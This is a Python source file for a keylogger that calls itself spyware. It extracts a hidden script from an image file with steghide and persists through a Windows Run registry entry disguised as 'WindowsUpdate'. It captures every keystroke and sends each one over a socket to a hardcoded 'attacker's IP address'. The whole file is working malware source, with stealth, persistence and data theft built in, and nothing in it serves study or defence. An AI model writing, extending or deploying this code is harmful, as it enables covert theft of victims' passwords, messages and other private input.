import os
import shutil
import socket
import logging
import subprocess  # For running commands
import pyxhook  # For keylogging
import winreg  # For setting auto-startup
from pathlib import Path

class Keylogger:
    def __init__(self, name):
        self._name = name
        self.target_path = self.get_dynamic_path("keylogger.py")

    def get_dynamic_path(self, filename):
        """ Get a universally accessible directory to store the keylogger. """
        base_dir = os.getenv("APPDATA")  # Gets AppData\Roaming directory
        if not base_dir:
            base_dir = os.getenv("TEMP")  # Fallback to Temp directory
        return os.path.join(base_dir, filename)

    def extract_keylogger(self, source_image, passphrase):
        """ Extract keylogger.py from the image file using steghide """
        try:
            extract_command = f'steghide extract -sf "{source_image}" -p "{passphrase}" -xf "{self.target_path}"'
            subprocess.run(extract_command, shell=True, check=True)
            print("[*] Keylogger extracted successfully.")
        except Exception as e:
            print(f"[!] Failed to extract keylogger: {e}")

    def add_to_startup(self):
        """ Add the keylogger to Windows startup """
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            name = "WindowsUpdate"  # Fake name to avoid suspicion
            value = f'pythonw "{self.target_path}"'
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, value)
            print("[*] Added to startup successfully.")
        except Exception as e:
            print(f"[!] Failed to add to startup: {e}")

    def start_logging(self):
        hook_manager = pyxhook.HookManager()
        hook_manager.KeyDown = self._keydown_callback
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key):
        logging.debug(chr(key.Ascii))
        self.send_log(chr(key.Ascii))

    def send_log(self, log_data):
        """ Send log data to the attacker's machine """
        host = '192.168.26.129'  # Attacker's IP address
        port = 9999  # Port to send data through
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.sendall(log_data.encode('utf-8'))
            s.close()
        except Exception as e:
            logging.error(f"Error sending logs: {e}")

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG, filename='activity.log', format='Key: %(message)s')

    # Step 1: Extract keylogger from image
    source_image = "LEGION.jpg"  # Ensure this file is in the same directory
    passphrase = "unknown2473"
    keylogger = Keylogger('SimpleSpyware')
    keylogger.extract_keylogger(source_image, passphrase)

    # Step 2: Add keylogger to startup
    keylogger.add_to_startup()

    # Step 3: Execute the keylogger
    if os.path.exists(keylogger.target_path):
        os.system(f'pythonw "{keylogger.target_path}"')  # Execute the keylogger in the background
    else:
        print("[!] Keylogger file not found.")
